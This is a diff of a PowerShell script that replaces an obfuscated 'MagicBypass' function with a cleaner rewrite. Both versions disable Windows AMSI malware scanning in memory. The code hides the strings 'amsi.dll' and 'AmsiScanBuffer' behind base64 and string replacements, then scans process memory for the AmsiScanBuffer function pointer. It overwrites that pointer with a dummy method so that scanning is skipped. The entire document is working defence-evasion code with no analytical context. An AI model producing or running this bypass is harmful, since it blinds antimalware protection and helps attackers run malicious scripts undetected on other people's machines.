@@ -1,24 +1,55 @@
-function MagicBypass {
-:initialloop for($bZPTm = $bYKHXkzoi2je7US; $bZPTm -lt $k2zlfZjEi; $bZPTm += $TAuN){
-    [IntPtr] $FpcOmqdSzYh7kPL = [Int64] $KyxpqEV93Znd - $bZPTm
-    $jVBy6NP2HvL8xpJQcTAe = [byte[]]::new($p4l9R)
-    $jq8f = [APIs]::ReadProcessMemory($Mp2fPIj05mA, $FpcOmqdSzYh7kPL, $jVBy6NP2HvL8xpJQcTAe, $p4l9R,[ref]$XsplXHxDwe0mXoDsL1g8N1V8)
-    for ($tzkbnN2gGacKf79BZPFChUT = 0; $tzkbnN2gGacKf79BZPFChUT -lt $jVBy6NP2HvL8xpJQcTAe.Length; $tzkbnN2gGacKf79B
-         $1J1VCat = [byte[]]($jVBy6NP2HvL8xpJQcTAe[$tzkbnN2gGacKf79BZPFChUT], $jVBy6NP2HvL8xpJQcTAe[$tzkbnN2gGacKf7 $jVBy6NP2HvL8xpJQcTAe[$tzkbnN2gGacKf79BZPFChUT + 4], $jVBy6NP2HvL8xpJQcTAe[$tzkbnN2gGacKf79BZPFChUT + 5], $jVBy6NP
-         [IntPtr] $wo8TEp61LLE0oBup = [bitconverter]::ToInt64($1J1VCat,0)
-         if ($wo8TEp61LLE0oBup -eq $3m0pQxb67Kucl) {
-                 & (("IBHuwEzs30yhOv9plCdDG2L-M65UXxgf8YZiRkKmctnJNVWQjeAFTaSboPr7q14")[46,58,35,41,49,23,2,56,7,41
-                 [IntPtr] $aBExfwdNn6IXsJ0F1oU3cutlh = [Int64] $FpcOmqdSzYh7kPL + $tzkbnN2gGacKf79BZPFChUT
-                 break initialloop
-         }
+$bx = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8sIHdvcmxk')) # hello, world
+
+$s1 = $bx.Replace('he','a').Replace('ll','m').Replace('o,','s').Replace(' ','i').Replace('wo','.d').Replace('rld','ll')
+$s2 = $bx.Replace('he','A').Replace('ll','m').Replace('o,','s').Replace(' ','i').Replace('wo','Sc').Replace('rld','an')
+$s3 = $bx.Replace('hello','Bu').Replace(', ','ff').Replace('world','er')
+
+$m = [Q]::GetModuleHandle($s1)
+$p = [Q]::GetProcAddress($m, $s2 + $s3)
+
+$a = [AppDomain]::CurrentDomain.GetAssemblies()
+$t = $a | Where-Object {
+    $_.Location -and $_.FullName -match '^S.*n$' -and $_.FullName.Length -eq 28
+} | ForEach-Object { $_.GetTypes() } | Select-Object -ExpandProperty Name -Unique | ForEach-Object {
+    [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {
+        $_.GetType($_)
     }
 }
-[IntPtr] $tnCq7RSh0AEyFz5981BLm6vH = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
-$l = [IntPtr[]] ($tnCq7RSh0AEyFz5981BLm6vH)
-[System.Runtime.InteropServices.Marshal]::Copy($l, 0, $aBExfwdNn6IXsJ0F1oU3cutlh, 1)
 
-$6W3WwGT9r91WcrldW=& (("0-Syl6gaduZTRUOGjF34kMCb7YvmfVIhE2ispno1XcLD8BtAHPxQWqw9zreJKN5")[15,58,46,1,43,7,46,58] -j
-$xy69 = ($6W3WwGT9r91WcrldW - $EzTBcaPi2).TotalSeconds;
-& (("IBHuwEzs30yhOv9plCdDG2L-M65UXxgf8YZiRkKmctnJNVWQjeAFTaSboPr7q14")[46,58,35,41,49,23,2,56,7,41] -join '') "$xy6
+$mtd = $a | ForEach-Object {
+    $_.GetTypes() | ForEach-Object {
+        $_.GetMethods('Static,NonPublic') | Where-Object {
+            $_.Name -match '^S.*t$' -and $_.Name.Length -eq 11
+        }
+    }
+} | Select-Object -First 1
+
+$fptr = $mtd.MethodHandle.GetFunctionPointer()
+$proc = [Q]::GetCurrentProcess()
+$ctr = 0
+$memPatch = [IntPtr]::Zero
+
+for ($i = ${GLOBAL:__x}; $i -lt ${GLOBAL:__z}; $i += ${GLOBAL:__y}) {
+    $target = [Int64]$fptr - $i
+    $buf = [byte[]]::new(${GLOBAL:__w})
+    $ok = [Q]::ReadProcessMemory($proc, [IntPtr]$target, $buf, ${GLOBAL:__w}, [ref]$ctr)
+
+    for ($j = 0; $j -lt ($buf.Length - 8); $j++) {
+        $cmp = [BitConverter]::ToInt64($buf, $j)
+        if ($cmp -eq $p) {
+            Write-Host "✓ Found @ offset: $i, index: $j"
+            $memPatch = [Int64]$target + $j
+            $i = ${GLOBAL:__z}  # Exit outer loop
+            break
+        }
+    }
 }
 
+if ($memPatch -ne [IntPtr]::Zero) {
+    $dummy = [Q].GetMethod('N').MethodHandle.GetFunctionPointer()
+    $patch = [IntPtr[]]($dummy)
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, [IntPtr]$memPatch, 1)
+}
+
+$elapsed = (Get-Date) - ${GLOBAL:__t}
+Write-Host "Time Elapsed: $($elapsed.TotalSeconds) seconds"
